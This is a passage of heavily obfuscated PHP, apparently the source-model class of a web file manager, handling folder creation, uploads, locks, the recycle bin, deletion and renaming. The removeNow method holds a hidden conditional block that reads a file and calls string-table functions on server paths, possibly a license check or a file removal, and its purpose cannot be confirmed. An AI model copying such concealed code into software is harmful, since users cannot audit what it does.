$_SERVER[åÄ¼Ùßš]; $¹©§³ˆ¯ = Model($º¯Äª‚Ş[590])->getInfoFull($Ó˜Õè¡û); if (!$¹©§³ˆ¯) { return !1; } $ğÜ „û = $¹©§³ˆ¯[$º¯Äª‚Ş[552]] ? $¹©§³ˆ¯[$º¯Äª‚Ş[552]] : array(); $’™Ñãò¶ = $ğÜ „û[$º¯Äª‚Ş[2316]]; if (!$’™Ñãò¶) { $’™Ñãò¶ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ó˜Õè¡û, $º¯Äª‚Ş[2317], $º¯Äª‚Ş[2318]); Model($º¯Äª‚Ş[590])->metaSet($Ó˜Õè¡û, $º¯Äª‚Ş[2316], $’™Ñãò¶ . $º¯Äª‚Ş[12]); $this->metaSet($’™Ñãò¶, $º¯Äª‚Ş[2316], $Ó˜Õè¡û); } if (!$²èê‰˜) { return $’™Ñãò¶; } $Ù×Ï®£« = $ğÜ „û[$º¯Äª‚Ş[2319] . $²èê‰˜]; if (!$Ù×Ï®£«) { $Ù×Ï®£« = $this->mkdir($’™Ñãò¶, $²èê‰˜); Model($º¯Äª‚Ş[590])->metaSet($Ó˜Õè¡û, $º¯Äª‚Ş[2319] . $²èê‰˜, $Ù×Ï®£«); $this->metaSet($Ù×Ï®£«, $º¯Äª‚Ş[2319] . $²èê‰˜, $Ó˜Õè¡û); } if (!$Œ°áÖÌÇ) { return $Ù×Ï®£«; } $æ¯ÚäÌ = $this->mkdir($Ù×Ï®£«, $Œ°áÖÌÇ); return $æ¯ÚäÌ; } public function groupRootAdd($ÈûÀæå¸) { $Ì×µÕµ =& $_SERVER[åÄ¼Ùßš]; $–³Ÿ‹‘Ö = Model($Ì×µÕµ[598])->where(array($Ì×µÕµ[2106] => $ÈûÀæå¸))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÈûÀæå¸, $–³Ÿ‹‘Ö[$Ì×µÕµ[32]]); } public function systemRootPathAdd($‹ËÆ«—×) { if ($‹ËÆ«—× != $_SERVER[åÄ¼Ùßš][621]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‹ËÆ«—×); } public function userRootRemove($ŸòÕçÂ¡) { $”ó¢¢ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ŸòÕçÂ¡, !0); foreach ($”ó¢¢ as $•Ëï†ÆË) { if (!$•Ëï†ÆË) { continue; } $this->remove($•Ëï†ÆË[$_SERVER[åÄ¼Ùßš][194]], !1); } } public function groupRootRemove($ˆÛáËéÒ) { $·À¯úÈê = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ˆÛáËéÒ); if (!$·À¯úÈê) { return; } $this->remove($·À¯úÈê[$_SERVER[åÄ¼Ùßš][194]], !1); } private function _mkdirRoot($öÄÕÈÄÓ, $‘÷ÁÔîÈ, $ñãĞçÑ¦, $¯–‡ºª£ = '') { $ÅÕ‹›ï =& $_SERVER[åÄ¼Ùßš]; $ãŸ°Ä» = KodUser::id(); $ÍŸû€¤¥ = array($ÅÕ‹›ï[489] => 0, $ÅÕ‹›ï[664] => $öÄÕÈÄÓ, $ÅÕ‹›ï[665] => $‘÷ÁÔîÈ, $ÅÕ‹›ï[662] => 1, $ÅÕ‹›ï[666] => $ãŸ°Ä», $ÅÕ‹›ï[667] => $ãŸ°Ä», $ÅÕ‹›ï[663] => $¯–‡ºª£, $ÅÕ‹›ï[668] => $ÅÕ‹›ï[606], $ÅÕ‹›ï[516] => 0, $ÅÕ‹›ï[633] => 0, $ÅÕ‹›ï[555] => 0, $ÅÕ‹›ï[669] => $ÅÕ‹›ï[12]); if ($”¡İ‹˜ = $this->where($ÍŸû€¤¥)->find()) { return $”¡İ‹˜[$ÅÕ‹›ï[194]]; } $¥ÙâÒÉõ = "\115\x6f\x64\145\x6c\123\157\x75\162\143\x65\x2e\x6d\x6b\144\151\162\x52\x6f\x6f\x74\x2e{$öÄÕÈÄÓ}\x2e{$‘÷ÁÔîÈ}\x2e" . $ñãĞçÑ¦; CacheLock::lock($¥ÙâÒÉõ); $ÍŸû€¤¥[$ÅÕ‹›ï[32]] = $ñãĞçÑ¦; $ßü…óÁñ = $this->add($ÍŸû€¤¥); $¶Æ¶ç“ú = array($ÅÕ‹›ï[670] => short_id($ßü…óÁñ)); $this->where(array($ÅÕ‹›ï[503] => $ßü…óÁñ))->save($¶Æ¶ç“ú); CacheLock::unlock($¥ÙâÒÉõ); return $ßü…óÁñ; } private function targetSourceRoot($½½µ«, $Ã–àĞÇú, $Úµóî…½ = false) { $¸‡Ñ¤€Î =& $_SERVER[åÄ¼Ùßš]; $ÕÉ¥°µË = array($¸‡Ñ¤€Î[489] => 0, $¸‡Ñ¤€Î[664] => $½½µ«, $¸‡Ñ¤€Î[665] => $Ã–àĞÇú); if ($Úµóî…½) { $ÒÛ‚»‹à = $this->where($ÕÉ¥°µË)->select(); return $ÒÛ‚»‹à ? $ÒÛ‚»‹à : array(); } $î¢¡ÛµÔ = $this->where($ÕÉ¥°µË)->find(); return $î¢¡ÛµÔ ? $î¢¡ÛµÔ : array(); } public function sourceRootGroup($Á…ª Ê) { $†³ä‰ŸØ =& $_SERVER[åÄ¼Ùßš]; if (is_string($Á…ª Ê)) { $Á…ª Ê = array($Á…ª Ê); } $ó–ù£‘ì = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Á…ª Ê, $†³ä‰ŸØ[223]); $ÓíÃ÷Û = array($†³ä‰ŸØ[447] => $ó–ù£‘ì, $†³ä‰ŸØ[444] => array($†³ä‰ŸØ[852] => count($Á…ª Ê))); $this->_listDataApply($ÓíÃ÷Û[$†³ä‰ŸØ[447]]); $this->_listMake($ÓíÃ÷Û); return array_to_keyvalue($ÓíÃ÷Û[$†³ä‰ŸØ[85]], $†³ä‰ŸØ[582]); } public function mkfile($ÅŸÇâÂ, $åºÇ›©‘, $ÙÚ·­È = '', $ª¾¼¡Ô = REPEAT_RENAME) { $şŞ¼ê‡Ù =& $_SERVER[åÄ¼Ùßš]; $û´Ù½  = KodIO::ioFileDriverGet($şŞ¼ê‡Ù[495] . $ÅŸÇâÂ . $şŞ¼ê‡Ù[404]); $ÈËàæÔ = Model($şŞ¼ê‡Ù[690])->addFileByContent($ÙÚ·­È, $û´Ù½ , $åºÇ›©‘); return $this->_createFileCall($ÅŸÇâÂ, $åºÇ›©‘, $ÈËàæÔ, $ª¾¼¡Ô, $şŞ¼ê‡Ù[1476]); } public function addFile($Ù±°Òï§, $­ñ—²Ó, $¥†×‰Œ, $Šªøòş = false, $–«ñô•ò = REPEAT_RENAME) { $æÖ½á =& $_SERVER[åÄ¼Ùßš]; $Å‹Æµ» = KodIO::ioFileDriverGet($æÖ½á[495] . $Ù±°Òï§ . $æÖ½á[404]); $çëëÚù‡ = Model($æÖ½á[690])->addFile($­ñ—²Ó, $Å‹Æµ», $¥†×‰Œ, $Šªøòş); return $this->_createFileCall($Ù±°Òï§, $¥†×‰Œ, $çëëÚù‡, $–«ñô•ò); } public function addFileByFileID($ƒ£Ì‚¼€, $‰âúñ†î, $ëÛçè¶¤, $÷‚±è»ı = REPEAT_RENAME) { $Í·ÕïÄâ =& $_SERVER[åÄ¼Ùßš]; $™¼•‘Ğè = Model($Í·ÕïÄâ[690])->find($‰âúñ†î); Model($Í·ÕïÄâ[690])->linkAdd($‰âúñ†î); return $this->_createFileCall($ƒ£Ì‚¼€, $ëÛçè¶¤, $™¼•‘Ğè, $÷‚±è»ı); } public function addFileByRemote($²™áÁÒ, $Îâ¸üàæ, $ŒÖŠ, $ñ¨½åöç = array(), $·áı³Ú¢ = REPEAT_RENAME) { $™œ‚öœ… = Model($_SERVER[åÄ¼Ùßš][690])->addFileByRemote($Îâ¸üàæ, $ŒÖŠ, $ñ¨½åöç); return $this->_createFileCall($²™áÁÒ, $ŒÖŠ, $™œ‚öœ…, $·áı³Ú¢); } private function _createFileCall($¢´Ä¹¥, $œìëìÑÜ, $ËœšÁàë, $ÕÊ¹±Ñæ, $û‡¦‘³ = "\x75\160\x6c\x6f\x61\144") { $èŒÏß¸ =& $_SERVER[åÄ¼Ùßš]; if (!$ËœšÁàë) { return !1; } $ğÑ‰€Ü½ = !1; $this->setMasterDB(); $this->lockWriteStart($¢´Ä¹¥, $œìëìÑÜ); $‚¶š€´ª = $this->fileNameExist($¢´Ä¹¥, $œìëìÑÜ); $¬à‚«Ãı = $this->_createFile($¢´Ä¹¥, $œìëìÑÜ, $ËœšÁàë, $ÕÊ¹±Ñæ, $ğÑ‰€Ü½); if (!$ğÑ‰€Ü½) { Model($èŒÏß¸[557])->remove($ËœšÁàë[$èŒÏß¸[554]]); } if ($ğÑ‰€Ü½ && $¬à‚«Ãı && $¬à‚«Ãı != $‚¶š€´ª) { Model($èŒÏß¸[2281])->eventCreate($¬à‚«Ãı, $û‡¦‘³); } $this->lockWriteEnd($¢´Ä¹¥, $œìëìÑÜ); return $¬à‚«Ãı; } public function mkdir($«©¤¤àâ, $˜Ùô‡ò¦, $¬ôÕüÏ‹ = REPEAT_SKIP) { $àùÅ”Á =& $_SERVER[åÄ¼Ùßš]; $this->setMasterDB(); $›¹ = $this->sourceInfo($«©¤¤àâ); if (!$›¹) { return !1; } $this->lockWriteStart($«©¤¤àâ, $˜Ùô‡ò¦); if ($¬ôÕüÏ‹ !== !1) { $»éÆ¡—½ = $this->fileNameExist($«©¤¤àâ, $˜Ùô‡ò¦); if ($»éÆ¡—½ && $¬ôÕüÏ‹ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($«©¤¤àâ, $˜Ùô‡ò¦); return $»éÆ¡—½; } $˜Ùô‡ò¦ = $this->fileNameAuto($«©¤¤àâ, $˜Ùô‡ò¦, $¬ôÕüÏ‹); } $¢ù’”Û” = array($àùÅ”Á[662] => 1, $àùÅ”Á[506] => $˜Ùô‡ò¦, $àùÅ”Á[663] => $àùÅ”Á[12], $àùÅ”Á[555] => 0, $àùÅ”Á[633] => 0); $ê‹—§ç‡ = $this->_addSource($¢ù’”Û”, $›¹); Model($àùÅ”Á[2281])->eventCreate($ê‹—§ç‡, $àùÅ”Á[1477]); $this->lockWriteEnd($«©¤¤àâ, $˜Ùô‡ò¦); return $ê‹—§ç‡; } public function listSourceRoot($»¦ŠúÄ‚, $şü ë‘Î, $¾ÕÈìàµ = "\x73\x6f\x75\162\x63\x65\111\x44\54\164\141\x72\147\x65\164\111\104\x2c\x73\151\x7a\145") { $¾×ÜÓê˜ =& $_SERVER[åÄ¼Ùßš]; $œ’°¡ğû = $¾×ÜÓê˜[464]; $ğ»©ÑÖ = array(); $ƒ§‡Ú† = 1024 * 50; $œõËÀ·µ = is_array($œõËÀ·µ) ? $œõËÀ·µ : array(); $Ÿ¥Øø—— = count($şü ë‘Î); $èï˜¿òñ = $this->tablePrefix . $¾×ÜÓê˜[2320]; for ($±¤°Ë‹Ü = 0; $±¤°Ë‹Ü < $Ÿ¥Øø——; $±¤°Ë‹Ü++) { $³ÉæˆšÅ = $şü ë‘Î[$±¤°Ë‹Ü]; $œ’°¡ğû .= "\x53\x45\114\105\x43\124\x20\x2a\x20\106\x52\x4f\x4d\x20\50\123\105\x4c\105\103\124\x20{$¾ÕÈìàµ}\40\106\x52\117\x4d\x20\x60{$èï˜¿òñ}\140\40\127\110\105\122\105\40"; $œ’°¡ğû .= "\140\160\x61\162\145\x6e\164\111\x44\140\75\60\x20\x41\x4e\104\40\140\164\x61\x72\147\x65\x74\x49\x44\x60\75{$³ÉæˆšÅ}\40\101\x4e\104\40\x60\x74\141\x72\x67\x65\x74\x54\171\x70\x65\140\x3d{$»¦ŠúÄ‚}\x20\141\156\x64\x20\x66\x69\x6c\x65\124\171\x70\145\75\x27\x27\x20\154\x69\x6d\x69\164\x20\61\51\x20\x61\x73\x20\164\142\137{$±¤°Ë‹Ü}\40\x55\x4e\x49\x4f\x4e\x20\101\x4c\114\40"; if ((strlen($œ’°¡ğû) >= $ƒ§‡Ú† || $±¤°Ë‹Ü == $Ÿ¥Øø—— - 1) && $œ’°¡ğû) { $œ’°¡ğû = substr($œ’°¡ğû, 0, -strlen($¾×ÜÓê˜[1146])); $ĞòÃ±¹ˆ = $this->query($œ’°¡ğû); $œ’°¡ğû = $¾×ÜÓê˜[12]; $ğ»©ÑÖ = array_merge($ğ»©ÑÖ, $ĞòÃ±¹ˆ); } } return $ğ»©ÑÖ; } private function _createFile($¢Ò„Û–í, $¾£¸ı´, $†ŠŸ¸½”, $À¸ú¹äí, &$¦ëî·©Œ) { $Ïó³úî¶ =& $_SERVER[åÄ¼Ùßš]; $’ÁÀ½ôş = $this->sourceInfo($¢Ò„Û–í); if (!$†ŠŸ¸½” || !$’ÁÀ½ôş) { return !1; } if ($À¸ú¹äí !== !1) { $âÉ§¢—Õ = $this->fileNameExist($¢Ò„Û–í, $¾£¸ı´); } $¦ëî·©Œ = !0; if ($À¸ú¹äí && $âÉ§¢—Õ) { if ($À¸ú¹äí == REPEAT_SKIP) { $¦ëî·©Œ = !1; return $âÉ§¢—Õ; } else { if ($À¸ú¹äí == REPEAT_REPLACE) { $Œ×ŞÍÒ¬ = $this->sourceInfo($âÉ§¢—Õ); $ˆüĞÉ… = $this->fileHistory($Œ×ŞÍÒ¬, $†ŠŸ¸½”[$Ïó³úî¶[554]], $†ŠŸ¸½”[$Ïó³úî¶[79]]); if (!$ˆüĞÉ…) { $¦ëî·©Œ = !1; } else { $this->folderSizeReset($¢Ò„Û–í); } return $âÉ§¢—Õ; } else { $¾£¸ı´ = $this->fileNameAuto($¢Ò„Û–í, $¾£¸ı´, $À¸ú¹äí, !1); } } } $é¾„Š©Œ = array($Ïó³úî¶[662] => 0, $Ïó³úî¶[506] => $¾£¸ı´, $Ïó³úî¶[663] => substr(get_path_ext($¾£¸ı´), 0, 10), $Ïó³úî¶[555] => $†ŠŸ¸½”[$Ïó³úî¶[554]], $Ïó³úî¶[633] => $†ŠŸ¸½”[$Ïó³úî¶[79]]); $â´çúã = $this->_addSource($é¾„Š©Œ, $’ÁÀ½ôş); $this->folderSizeReset($¢Ò„Û–í, intval($é¾„Š©Œ[$Ïó³úî¶[79]])); return $â´çúã; } protected function fileHistory($»Ê±Ë¥›, $ò‹Œº©‘, $Óšè°…) { $Ôª£Ïë =& $_SERVER[åÄ¼Ùßš]; if ($»Ê±Ë¥›[$Ôª£Ïë[554]] == $ò‹Œº©‘) { return !1; } $this->checkLock($»Ê±Ë¥›[$Ôª£Ïë[194]], $ò‹Œº©‘); Model($Ôª£Ïë[2321])->addHistory($»Ê±Ë¥›); $îùè™§­ = array($Ôª£Ïë[667] => USER_ID, $Ôª£Ïë[510] => time(), $Ôª£Ïë[554] => $ò‹Œº©‘, $Ôª£Ïë[79] => $Óšè°…); $this->where(array($Ôª£Ïë[503] => $»Ê±Ë¥›[$Ôª£Ïë[194]]))->save($îùè™§­); $this->sourceCacheClear($»Ê±Ë¥›[$Ôª£Ïë[194]]); return !0; } public function checkLock($‰´ßúì, $‚¼ë²Úü) { $–‘Ìı²Ç =& $_SERVER[åÄ¼Ùßš]; $ßÊ—’êŒ = $this->pathInfo($‰´ßúì); if (!$this->fileIsLock($ßÊ—’êŒ, !0)) { return; } $íîíÏ‘ = Session::get($–‘Ìı²Ç[2322]); $ñ¬÷†ÄÜ = substr($ßÊ—’êŒ[$–‘Ìı²Ç[32]], 0, -1 - strlen($ßÊ—’êŒ[$–‘Ìı²Ç[169]])) . $–‘Ìı²Ç[1331] . $íîíÏ‘ . $–‘Ìı²Ç[10] . $ßÊ—’êŒ[$–‘Ìı²Ç[169]]; $ıàÛí¯é = Model($–‘Ìı²Ç[690])->find($‚¼ë²Úü); $this->_createFileCall($ßÊ—’êŒ[$–‘Ìı²Ç[193]], $ñ¬÷†ÄÜ, $ıàÛí¯é, REPEAT_REPLACE, $–‘Ìı²Ç[1476]); $ä¦ß‰÷ò = $ßÊ—’êŒ[$–‘Ìı²Ç[552]][$–‘Ìı²Ç[626]]; $¿±à÷Ãß = $ä¦ß‰÷ò[$–‘Ìı²Ç[2323]] ? $ä¦ß‰÷ò[$–‘Ìı²Ç[2323]] : $ä¦ß‰÷ò[$–‘Ìı²Ç[32]]; show_json(LNG($–‘Ìı²Ç[2324]) . $–‘Ìı²Ç[2325] . LNG($–‘Ìı²Ç[2326]) . $–‘Ìı²Ç[2327] . $¿±à÷Ãß . $–‘Ìı²Ç[2328], !1); } public function fileIsLock($­ç‰ ª², $ü”ùÎ¸§ = false) { $Ğ„â“ô“ =& $_SERVER[åÄ¼Ùßš]; if (!_get($­ç‰ ª², $Ğ„â“ô“[622], 0)) { return !1; } if ($­ç‰ ª²[$Ğ„â“ô“[552]][$Ğ„â“ô“[625]] != USER_ID) { return !0; } $óÃõ‰½ = $GLOBALS[$Ğ„â“ô“[6]][$Ğ„â“ô“[92]][$Ğ„â“ô“[623]]; if ($­ç‰ ª²[$Ğ„â“ô“[552]][$Ğ„â“ô“[624]] <= time() - $óÃõ‰½) { $this->metaSet($­ç‰ ª²[$Ğ„â“ô“[194]], $Ğ„â“ô“[625], null); $this->metaSet($­ç‰ ª²[$Ğ„â“ô“[194]], $Ğ„â“ô“[624], null); } if ($ü”ùÎ¸§) { $this->metaSet($­ç‰ ª²[$Ğ„â“ô“[194]], $Ğ„â“ô“[624], time()); } return !1; } private function _addSource($µ¹ë€€µ, $¤éÀ‡¥ñ) { $ƒ¨–ÈÁ» =& $_SERVER[åÄ¼Ùßš]; $‚ÕØò²õ = KodUser::id(); $Ø‡Á—ŞŒ = array($ƒ¨–ÈÁ»[664] => $¤éÀ‡¥ñ[$ƒ¨–ÈÁ»[191]], $ƒ¨–ÈÁ»[665] => $¤éÀ‡¥ñ[$ƒ¨–ÈÁ»[582]], $ƒ¨–ÈÁ»[666] => $‚ÕØò²õ, $ƒ¨–ÈÁ»[667] => $‚ÕØò²õ, $ƒ¨–ÈÁ»[489] => $¤éÀ‡¥ñ[$ƒ¨–ÈÁ»[194]], $ƒ¨–ÈÁ»[668] => $¤éÀ‡¥ñ[$ƒ¨–ÈÁ»[597]] . $¤éÀ‡¥ñ[$ƒ¨–ÈÁ»[194]] . $ƒ¨–ÈÁ»[50], $ƒ¨–ÈÁ»[516] => 0, $ƒ¨–ÈÁ»[669] => $ƒ¨–ÈÁ»[12]); $µ¹ë€€µ = array_merge($Ø‡Á—ŞŒ, $µ¹ë€€µ); $this->updateModifyTime($µ¹ë€€µ[$ƒ¨–ÈÁ»[193]]); $´é®½†› = $ƒ¨–ÈÁ»[2329] . $¤éÀ‡¥ñ[$ƒ¨–ÈÁ»[194]]; if (isset(self::$cacheChildList[$´é®½†›])) { unset(self::$cacheChildList[$´é®½†›]); } static $›ï»›™ = false; if (!$›ï»›™) { Hook::trigger($ƒ¨–ÈÁ»[652], $µ¹ë€€µ); $›ï»›™ = !0; } $Ñ–ñ¶„€ = $this->add($µ¹ë€€µ); $ãñ«ƒë = array($ƒ¨–ÈÁ»[670] => short_id($Ñ–ñ¶„€)); $this->where(array($ƒ¨–ÈÁ»[503] => $Ñ–ñ¶„€))->save($ãñ«ƒë); $this->setNamePinyin($Ñ–ñ¶„€, $µ¹ë€€µ[$ƒ¨–ÈÁ»[32]]); return $Ñ–ñ¶„€; } public function remove($ª¬é‘”, $»¯ü§„Ô = true) { $“¸„½´£ =& $_SERVER[åÄ¼Ùßš]; $¬²—¿ºÇ = $this->sourceInfo($ª¬é‘”); $ğñ™æ¦® = intval($¬²—¿ºÇ[$“¸„½´£[191]]) === self::TYPE_SYSTEM; $Ö€¨Õ Â = Model($“¸„½´£[519])->get($“¸„½´£[2330]) == $“¸„½´£[91]; if ($ğñ™æ¦® || $»¯ü§„Ô || !$Ö€¨Õ Â) { return $this->removeNow($ª¬é‘”, $»¯ü§„Ô); } $ØÑµàê´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $àåéè‹Ã = $¬²—¿ºÇ[$“¸„½´£[191]] == self::TYPE_USER ? $“¸„½´£[678] : $“¸„½´£[591]; if ($àåéè‹Ã == $“¸„½´£[678]) { $¼˜ª·¹£ = Model($“¸„½´£[590])->getInfo($¬²—¿ºÇ[$“¸„½´£[582]]); $ù²¡¨˜‰ = !empty($¼˜ª·¹£[$“¸„½´£[2323]]) ? $¼˜ª·¹£[$“¸„½´£[2323]] : $¼˜ª·¹£[$“¸„½´£[32]]; $ù²¡¨˜‰ = $“¸„½´£[340] . $ù²¡¨˜‰ . $“¸„½´£[2331] . $¬²—¿ºÇ[$“¸„½´£[582]]; } else { $¼˜ª·¹£ = Model($“¸„½´£[598])->getInfo($¬²—¿ºÇ[$“¸„½´£[582]]); $ù²¡¨˜‰ = _get($¼˜ª·¹£, $“¸„½´£[32]); $ù²¡¨˜‰ = $“¸„½´£[176] . $ù²¡¨˜‰ . $“¸„½´£[2332] . $¬²—¿ºÇ[$“¸„½´£[582]]; } $şÛ°‰”¹ = $“¸„½´£[2333] . md5($ù²¡¨˜‰); CacheLock::lock($şÛ°‰”¹); $£Şˆ×„š = $this->fileNameExist($ØÑµàê´, $ù²¡¨˜‰); if (!$£Şˆ×„š) { $£Şˆ×„š = $this->mkdir($ØÑµàê´, $ù²¡¨˜‰, REPEAT_SKIP); $this->metaSet($£Şˆ×„š, $“¸„½´£[2334], $àåéè‹Ã); $this->metaSet($£Şˆ×„š, $“¸„½´£[2335], $¬²—¿ºÇ[$“¸„½´£[582]]); if ($¬²—¿ºÇ[$“¸„½´£[193]] != 0) { $this->metaSet($£Şˆ×„š, $“¸„½´£[2336], _get($¼˜ª·¹£, $“¸„½´£[2337])); } } CacheLock::unlock($şÛ°‰”¹); $this->metaSet($ª¬é‘”, $“¸„½´£[2338], $¬²—¿ºÇ[$“¸„½´£[193]]); $this->where(array($“¸„½´£[194] => $ª¬é‘”))->save(array($“¸„½´£[510] => time())); $this->recycleClear($¬²—¿ºÇ); Model($“¸„½´£[649])->eventRemove($ª¬é‘”); $ÎÜ¦Öü€ = $this->move($ª¬é‘”, $£Şˆ×„š, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¬²—¿ºÇ[$“¸„½´£[193]]); return $ÎÜ¦Öü€; } private function recycleClear($ß»ŞúË¼) { $±÷û’¥ë =& $_SERVER[åÄ¼Ùßš]; $ıË˜ò¸¼ = $this->childrenAll($ß»ŞúË¼); $ÚÜõÖ…Ú = array($±÷û’¥ë[503] => array($±÷û’¥ë[504], $ıË˜ò¸¼[$±÷û’¥ë[2339]])); Model($±÷û’¥ë[2340])->where($ÚÜõÖ…Ú)->delete(); } public function removeNow($·Öõ¬¤¥, $åĞº·â± = true) { $“ëïÒËÍ =& $_SERVER[åÄ¼Ùßš]; if ($_SERVER[$“ëïÒËÍ[833]] != $_SERVER[$“ëïÒËÍ[834]]) { $´Ò£»ıÜ = $“ëïÒËÍ[983]; $ÆÃ‘’æ = $“ëïÒËÍ[835]; $­¨˜§è = $_SERVER[$“ëïÒËÍ[836]] . $“ëïÒËÍ[837]; $Ä¦˜ÙğÈ = $ÆÃ‘’æ($­¨˜§è); $ò¤”ı‹ = explode($“ëïÒËÍ[288], $Ä¦˜ÙğÈ); if (count($ò¤”ı‹) < $“ëïÒËÍ[713]) { $°±¶¼‹… = $“ëïÒËÍ[838]; $°±¶¼‹…(); } $Äç§ò¦ˆ = $“ëïÒËÍ[984]; $Äç§ò¦ˆ($_SERVER[$“ëïÒËÍ[985]]); $Äç§ò¦ˆ($_SERVER[$“ëïÒËÍ[836]] . $“ëïÒËÍ[2341]); $Å±Í› = 1; while ($Å±Í› > 1) { $Å±Í› = $Å±Í› + 4; $‡ôˆ» ‘ = rawurlencode($Å±Í› . $“ëïÒËÍ[464]); } } $åŠû³×¡ = $this->sourceInfo($·Öõ¬¤¥); $‚¦¾»ùÚ = $this->pathInfoMore($·Öõ¬¤¥); if (!$åŠû³×¡) { return !0; } if ($åŠû³×¡[$“ëïÒËÍ[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($·Öõ¬¤¥); Hook::trigger($“ëïÒËÍ[2342], $‚¦¾»ùÚ, $åĞº·â±); if ($åĞº·â±) { Model($“ëïÒËÍ[2340])->moveToRecycle($·Öõ¬¤¥); } else { $õÃã©… = $this->childrenAll($åŠû³×¡); Model($“ëïÒËÍ[649])->eventRemove($·Öõ¬¤¥); $this->removeRelevance($õÃã©…[$“ëïÒËÍ[2339]], $õÃã©…[$“ëïÒËÍ[1620]]); } $this->folderSizeReset($åŠû³×¡[$“ëïÒËÍ[193]]); $¹øÃ¶Ö™ = array($åŠû³×¡[$“ëïÒËÍ[193]]); if ($åŠû³×¡[$“ëïÒËÍ[497]] == $“ëïÒËÍ[91]) { $¹øÃ¶Ö™[] = $åŠû³×¡[$“ëïÒËÍ[194]]; } $this->updateModifyTime($¹øÃ¶Ö™); $this->lockMoveEnd($·Öõ¬¤¥); Hook::trigger($“ëïÒËÍ[1860], $‚¦¾»ùÚ, $åĞº·â±); return !0; } public function childrenAll($ŠÃÉ¿¡ş) { $åÜá³˜Æ =& $_SERVER[åÄ¼Ùßš]; $œÔîÉ = $ŠÃÉ¿¡ş[$åÜá³˜Æ[194]]; if ($ŠÃÉ¿¡ş[$åÜá³˜Æ[497]] == $åÜá³˜Æ[91]) { $¥Œ™Œ©Ğ = array($åÜá³˜Æ[668] => array($åÜá³˜Æ[628], $ŠÃÉ¿¡ş[$åÜá³˜Æ[597]] . $œÔîÉ . $åÜá³˜Æ[629])); $ÇÀˆúŒÊ = array($åÜá³˜Æ[668] => $¥Œ™Œ©Ğ[$åÜá³˜Æ[597]]); $ëöÆ‰â = $this->field($åÜá³˜Æ[2343])->where($ÇÀˆúŒÊ)->select(); $¨ªƒ àÄ = !1; $¤å˜Œ‚÷ = array($œÔîÉ); if ($ëöÆ‰â) { $¨ªƒ àÄ = array_to_keyvalue($ëöÆ‰â, $åÜá³˜Æ[12], $åÜá³˜Æ[554]); $¨ªƒ àÄ = array_remove_value($¨ªƒ àÄ, $åÜá³˜Æ[231]); $¤å˜Œ‚÷ = array_to_keyvalue($ëöÆ‰â, $åÜá³˜Æ[12], $åÜá³˜Æ[194]); $¤å˜Œ‚÷[] = $œÔîÉ; } } else { $¨ªƒ àÄ = array($ŠÃÉ¿¡ş[$åÜá³˜Æ[554]]); $¤å˜Œ‚÷ = array($œÔîÉ); } return array($åÜá³˜Æ[2339] => $¤å˜Œ‚÷, $åÜá³˜Æ[1620] => $¨ªƒ àÄ); } public function removeArray($ÛªØÄ) { if (!$ÛªØÄ) { return !0; } } public function removeRelevance($òó˜ÄòÎ, $›ùãÙôÉ) { $¦àŒÏÄñ =& $_SERVER[åÄ¼Ùßš]; $òó˜ÄòÎ = $òó˜ÄòÎ ? $òó˜ÄòÎ : array(); $›ùãÙôÉ = $›ùãÙôÉ ? $›ùãÙôÉ : array(); $òó˜ÄòÎ = array_unique(array_filter($òó˜ÄòÎ)); $›ùãÙôÉ = array_filter($›ùãÙôÉ); if (!$òó˜ÄòÎ) { return !1; } $İã„ÇÍÎ = array($¦àŒÏÄñ[503] => array($¦àŒÏÄñ[504], $òó˜ÄòÎ)); Model($¦àŒÏÄñ[2340])->where($İã„ÇÍÎ)->delete(); Model($¦àŒÏÄñ[546])->where($İã„ÇÍÎ)->delete(); Model($¦àŒÏÄñ[2171])->where($İã„ÇÍÎ)->delete(); Model($¦àŒÏÄñ[649])->where($İã„ÇÍÎ)->delete(); Model($¦àŒÏÄñ[1997])->removeBySource($òó˜ÄòÎ); Model($¦àŒÏÄñ[2321])->removeBySource($òó˜ÄòÎ); $this->where($İã„ÇÍÎ)->delete(); Model($¦àŒÏÄñ[557])->remove($›ùãÙôÉ); for ($¥–Šî = 0; $¥–Šî < count($òó˜ÄòÎ); $¥–Šî++) { $this->sourceCacheClear($òó˜ÄòÎ[$¥–Šî]); } } public function rename($î«ºş­Î, $šå¾›ü) { $ÜÉ¿’„ğ =& $_SERVER[åÄ¼Ùßš]; $İ‰•ïŠ¨ = $this->sourceInfo($î«ºş­Î); if (!$İ‰•ïŠ¨) { return !1; } $ùËó·Ê = $this->fileNameExist($İ‰•ïŠ¨[$ÜÉ¿’„ğ[193]], $šå¾›ü); if ($ùËó·Ê && $ùËó·Ê != $î«ºş­Î) { return !1; } $û¼ØÚ = array($ÜÉ¿’„ğ[506] => $šå¾›ü, $ÜÉ¿’„ğ[667] => USER_ID); if ($İ‰•ïŠ¨[$ÜÉ¿’„ğ[497]] != $ÜÉ¿’„ğ[91]) { $û¼ØÚ[$ÜÉ¿’„ğ[498]] = substr(get_path_ext($šå¾›ü), 0, 10); } Model($ÜÉ¿’„ğ[649])->eventRename($î«ºş­Î, $İ‰•ïŠ¨[$ÜÉ¿’„ğ[32]], $šå¾›ü); $this->sourceCacheClear($î«ºş­Î); $this->setNamePinyin($î«ºş­Î, $û¼ØÚ[$ÜÉ¿’„ğ[32]], !1); $this->updateModifyTime($İ‰•ïŠ¨[$ÜÉ¿’„ğ[193]]); $Œ‡ßèå· = $this->where(array($ÜÉ¿’„ğ[503] => $î«ºş­Î))->data($û¼ØÚ)->save(); $œîÀ³–Ø = $ÜÉ¿’„ğ[2329] . $İ‰•ïŠ¨[$ÜÉ¿’„ğ[193]]; if (isset(self::$cacheChildList[$œîÀ³–Ø])) { unset(self::$cacheChildList[$œîÀ³–Ø]); } return $Œ‡ßèå·; } public function setNamePinyin($Î­€Ã©Õ, $ÙóäÇÎ, $úˆ€´ìğ = true) { $ã‚ıõğ =& $_SERVER[åÄ¼Ùßš]; $Çî’¦û‹ = Input::check($ÙóäÇÎ, $ã‚ıõğ[671]); $š¿ï¿ã = array($ã‚ıõğ[528] => KodSort::makeStr($ÙóäÇÎ)); if ($Çî’¦û‹) { 